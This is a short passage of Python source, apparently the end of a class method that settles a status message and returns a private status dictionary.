                self.__status['message']) == 0 else self.__status['message']
        return self.__status

